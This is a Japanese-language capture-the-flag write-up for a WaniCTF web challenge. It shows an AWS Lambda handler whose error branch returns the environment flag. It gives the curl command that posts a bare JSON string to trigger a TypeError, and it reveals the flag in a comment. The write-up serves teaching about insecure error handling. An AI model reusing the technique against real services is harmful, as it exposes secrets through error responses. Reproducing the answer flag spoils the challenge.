# Writeup

ページにアクセスするとフォームがあり、POSTしたデータを表示してくれる。

![](img/2021-05-01-00-53-36.png)

サーバーサイド(Lambda)のソースコードが与えられており、★の部分で例外を起こせば良さそうだと分かる。

```py
# HelloFunction(/hello)のコード
def lambda_handler(event, context):
    try:
        try:
            data = json.loads(event["body"])
        except Exception:
            data = {}
        if "name" in data:
            return {
                "statusCode": 200,
                "body": json.dumps({"name": "こんにちは、" + data["name"] + "さん"}), // ★
            }
        return {
            "statusCode": 400,
            "body": json.dumps(
                {
                    "error_message": "Bad Request",
                }
            ),
        }
    except Exception as e:
        error_message = traceback.format_exception_only(type(e), e)
        del event["requestContext"]["accountId"]
        del event["requestContext"]["resourceId"]
        return {
            "statusCode": 500,
            "body": json.dumps(
                {
                    "error_message": error_message,
                    "event": event,
                    "flag": os.environ.get("FLAG"),
                }
            ),
        }
```

ソースを読むと、ボタンのイベントではJSON形式になってしまうので、`curl`コマンドで`body`を書き換える。

```html
<script>
    $('#id_btn_submit').on('click', () => {
      fetch('/hello', {
        method: 'POST',
        body: JSON.stringify({ name: $('#id_input_name').val() }),
        headers: { 'Content-Type': 'application/json' },
      }).then((res) => res.json()).then((res) => {
        $('#id_output').text(res['name']);
      }).catch(console.error);
    });
  </script>
```

以下のコマンドを実行すると、★部分が`TypeError: string indices must be integers`というエラーに引っ掛かり、フラグが得られる。

```bash
$ curl https://exception.web.wanictf.org/hello -X POST -d '"name"' -H "Content-Type:application/json"
```

<!-- FLAG{b4d_excep7ion_handl1ng} -->
